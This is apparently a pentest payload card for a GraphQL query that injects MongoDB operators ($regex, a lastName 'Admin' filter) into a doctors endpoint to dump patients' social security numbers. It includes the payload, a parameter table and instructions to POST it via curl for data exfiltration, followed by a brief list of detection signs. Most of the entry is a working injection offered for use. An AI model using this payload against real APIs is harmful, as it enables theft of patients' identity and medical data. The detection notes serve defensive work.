---
id: b92aa5ab-daa3-4da8-bb28-785f8c91dfc9
name: GraphQL-Doctors-Query-with-NoSQL-Injection
type: code
language: json
verified: true
created_at: '2023-04-06T03:55:58.926511+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - graphql
  - nosql-injection
  - payload
validated: true
---

# GraphQL-Doctors-Query-with-NoSQL-Injection

## Code

```json
{
  doctors(
    options: "{\"limit\": 1, \"patients.ssn\" :1}", 
    search: "{ \"patients.ssn\": { \"$regex\": ".*\"}, \"lastName\":\"Admin\" }")
    {
      firstName lastName id patients{ssn}
    }
}
```

## Description

This JSON-formatted GraphQL query injects NoSQL operators into the search parameter to exploit a vulnerable endpoint, using $regex to match all SSNs and targeting admin accounts to retrieve unauthorized patient data including SSNs.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| options | JSON string limiting results and projecting SSN fields | "{\"limit\": 1, \"patients.ssn\" :1}" |
| search | Injection payload with $regex and lastName filter | "{ \"patients.ssn\": { \"$regex\": ".*\"}, \"lastName\":\"Admin\" }" |

## Usage

Wrap this query in a full JSON payload for HTTP POST: {"query": "[escaped query here]"}. Send via curl or a GraphQL client to the /graphql endpoint. Useful in web pentests targeting MongoDB-backed GraphQL APIs for data exfiltration.

## Detection

- GraphQL logs showing queries with $regex or $ne operators.
- Anomalous response sizes indicating bulk data dumps.
- WAF alerts on JSON payloads containing regex patterns in search fields.
- Database query logs revealing unparameterized NoSQL operations.

## Related

- [[procedures/GraphQL-Injection-for-NoSQL-Exploitation]]
